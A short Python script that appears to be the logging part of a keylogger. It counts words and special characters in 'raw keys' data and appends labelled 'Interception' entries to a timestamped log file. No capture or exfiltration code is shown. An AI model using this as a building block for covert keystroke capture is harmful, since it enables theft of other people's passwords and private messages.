import datetime, platform, re, os

# Absolute pathing ensures files don't vanish into system directories
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSION_ID = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_FILENAME = os.path.join(BASE_DIR, f"log_{platform.system()}_{SESSION_ID}.txt")

def finalize_log(raw_data):
    if not raw_data: return
    
    # Precise statistical breakdown
    words = len(raw_data.split())
    spaces = raw_data.count(' ')
    specials = len(re.findall(r'[^a-zA-Z0-9\s]', raw_data))
    
    now = datetime.datetime.now()
    log_entry = (
        f"--- {platform.system()} Interception | Session: {SESSION_ID} ---\n"
        f"Date: {now.strftime('%Y-%m-%d')} | Time: {now.strftime('%H:%M:%S')} | Day: {now.strftime('%A')}\n"
        f"Words Captured: {words} | Spaces Captured: {spaces} | Special Characters: {specials}\n"
        f"Raw Keys: {raw_data}\n"
        f"{'='*60}\n\n"
    )
    
    # Write directly to the unique session file
    with open(LOG_FILENAME, "a", encoding="utf-8") as f:
        f.write(log_entry)
